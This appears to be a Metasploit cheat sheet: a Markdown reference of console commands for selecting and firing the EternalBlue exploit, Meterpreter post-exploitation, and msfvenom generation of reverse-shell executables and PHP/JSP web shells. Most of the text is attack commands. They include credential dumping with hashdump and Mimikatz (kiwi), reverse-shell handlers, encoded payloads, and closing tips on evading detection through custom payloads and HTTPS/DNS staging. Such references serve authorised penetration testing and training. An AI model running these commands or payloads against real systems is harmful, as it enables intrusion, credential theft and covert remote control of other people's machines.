# Metasploit Framework

## Overview
The world's most used penetration testing framework for exploit development and execution.

## Starting Metasploit
```bash
msfconsole                    # Start console
msfdb init                    # Initialize database
msfconsole -q                 # Quiet mode (no banner)
```

## Core Commands

### Search & Select
```bash
search type:exploit platform:windows smb
search cve:2017-0144
use exploit/windows/smb/ms17_010_eternalblue
info                          # Show module info
options                       # Show required options
advanced                      # Show advanced options
```

### Configuration
```bash
set RHOSTS 192.168.1.100      # Target
set RPORT 445                 # Target port
set LHOST 192.168.1.50        # Attacker IP
set LPORT 4444                # Listener port
set PAYLOAD windows/x64/meterpreter/reverse_tcp
setg LHOST 192.168.1.50       # Global setting
```

### Execution
```bash
check                         # Check if vulnerable (if supported)
exploit                       # Run exploit
run                          # Same as exploit
exploit -j                    # Run as background job
```

### Session Management
```bash
sessions                      # List sessions
sessions -i 1                 # Interact with session 1
sessions -k 1                 # Kill session 1
background                    # Background current session (Ctrl+Z)
```

## Meterpreter Commands

### Core
```bash
sysinfo                       # System info
getuid                        # Current user
getpid                        # Current process ID
ps                           # List processes
migrate PID                   # Migrate to process
```

### File System
```bash
pwd                          # Print working directory
cd C:\\                       # Change directory
ls                           # List files
download file.txt             # Download file
upload /local/file.txt        # Upload file
cat file.txt                  # Read file
edit file.txt                 # Edit file
rm file.txt                   # Delete file
```

### Privilege Escalation
```bash
getsystem                     # Attempt SYSTEM escalation
getprivs                      # Show privileges
hashdump                      # Dump SAM hashes
```

### Network
```bash
ipconfig                      # Network config
route                        # Routing table
portfwd add -l 8080 -p 80 -r 10.0.0.1  # Port forward
```

### Credential Harvesting
```bash
load kiwi                     # Load Mimikatz
creds_all                     # All credentials
lsa_dump_sam                  # Dump SAM
lsa_dump_secrets              # Dump LSA secrets
```

## Post-Exploitation Modules

```bash
use post/windows/gather/hashdump
use post/windows/gather/enum_logged_on_users
use post/multi/recon/local_exploit_suggester
use post/windows/manage/enable_rdp
```

## Handlers

### Setting Up Listeners
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
```

## Payload Generation (msfvenom)

```bash
# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.jsp

# Encoded payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

## Database Commands
```bash
db_status                     # Check DB connection
workspace                     # List workspaces
workspace -a project1         # Create workspace
hosts                        # List hosts
services                     # List services
vulns                        # List vulnerabilities
creds                        # List credentials
loot                         # List loot
```

## Detection Risk
- **High**: Metasploit payloads are well-signatured
- Use custom payloads for stealth
- Avoid default ports (4444)
- Use HTTPS/DNS staging
